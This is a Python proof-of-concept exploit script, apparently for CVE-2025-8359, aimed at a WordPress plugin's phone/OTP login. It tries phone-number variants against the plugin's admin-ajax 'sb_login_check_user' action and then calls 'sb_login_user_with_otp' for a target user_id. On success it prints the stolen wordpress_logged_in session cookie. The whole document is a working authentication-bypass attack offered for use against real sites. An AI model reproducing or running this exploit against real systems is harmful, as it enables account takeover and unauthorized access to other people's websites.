import requests
import argparse
from requests.utils import quote

#By: Nxploited (Khaled ALenazi)

def Nxploited_print(msg, level="info"):
    levels = {"info": "[*]", "success": "[+]", "fail": "[-]", "warn": "[!]" }
    print(f"{levels.get(level, '[*]')} {msg}")

def generate_phone_variants(phone):
    variants = set()
    phone = phone.strip()
    # raw
    variants.add(phone)
    # without spaces
    variants.add(phone.replace(" ", ""))
    # with encoded +
    if "+" in phone:
        variants.add(phone.replace("+", "%2B"))
        variants.add(quote(phone))
        variants.add(quote(phone.replace(" ", "")))
    # without +
    variants.add(phone.replace("+", ""))
    # with spaces replaced with %20
    variants.add(phone.replace(" ", "%20"))
    # only digits
    variants.add("".join(filter(str.isdigit, phone)))
    return list(variants)

def Nxploited_exploit(base_url, phone_variants, user_id, name="test"):
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/plain, */*",
        "Referer": base_url,
        "Connection": "close",
    }

    for idx, phone in enumerate(phone_variants):
        Nxploited_print(f"Trying variant {idx+1}/{len(phone_variants)}: '{phone}'", "info")
        check_data = {
            "action": "sb_login_check_user",
            "form_data": f"sb_reg_phone={phone}",
        }
        resp1 = session.post(
            f"{base_url}/wp-admin/admin-ajax.php",
            headers=headers,
            data=check_data,
            allow_redirects=False,
            timeout=15,
            verify=False,
        )
        Nxploited_print(f"Response check_user: {resp1.text[:200]}", "info")
        if '"success":true' in resp1.text:
            Nxploited_print(f"Phone variant worked: '{phone}'", "success")
            # Extract user_id if present in response (auto-detect)
            try:
                import re
                found = re.search(r'"user_id":"?(\d+)"?', resp1.text)
                if found:
                    user_id = found.group(1)
                    Nxploited_print(f"Auto-detected user_id: {user_id}", "info")
            except Exception: pass

            otp_data = {
                "action": "sb_login_user_with_otp",
                "user_id": str(user_id),
                "form_data": f"sb_reg_name={name}",
            }
            resp2 = session.post(
                f"{base_url}/wp-admin/admin-ajax.php",
                headers=headers,
                data=otp_data,
                allow_redirects=False,
                timeout=15,
                verify=False,
            )
            Nxploited_print(f"Response login_with_otp: {resp2.text[:200]}", "info")
            cookies = session.cookies.get_dict()
            for k, v in cookies.items():
                if "wordpress_logged_in" in k:
                    Nxploited_print(f"Logged in! Cookie: {k}={v}", "success")
                    return
            Nxploited_print("Login failed (see above response).", "fail")
            return
        else:
            Nxploited_print("Variant failed.", "fail")
    Nxploited_print("All variants failed. Try other phone formats or check the database.", "fail")

def Nxploited_main():
    parser = argparse.ArgumentParser(description="Nxploited: PoC for CVE-2025-8359")
    parser.add_argument("-u", "--url", required=True, help="Base URL (e.g. http://target/wordpress)")
    parser.add_argument("-p", "--phone", required=True, help="Phone number (e.g. +966 555 555 555)")
    parser.add_argument("-i", "--userid", required=True, help="Target user_id (e.g. 1)")
    parser.add_argument("-n", "--name", default="test", help="Name for sb_reg_name")
    args = parser.parse_args()
    variants = generate_phone_variants(args.phone)
    Nxploited_print(f"Testing {len(variants)} variants for phone: {args.phone}", "info")
    Nxploited_exploit(args.url, variants, args.userid, args.name)

if __name__ == "__main__":
    Nxploited_main()
